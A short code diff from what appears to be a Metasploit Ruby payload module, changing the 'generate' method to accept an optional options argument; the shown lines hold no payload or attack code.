@@ -27,7 +27,7 @@ module MetasploitModule
     ))
   end
 
-  def generate
+  def generate(_opts = {})
     rbs = prepends(ruby_string)
     vprint_good rbs
     return rbs
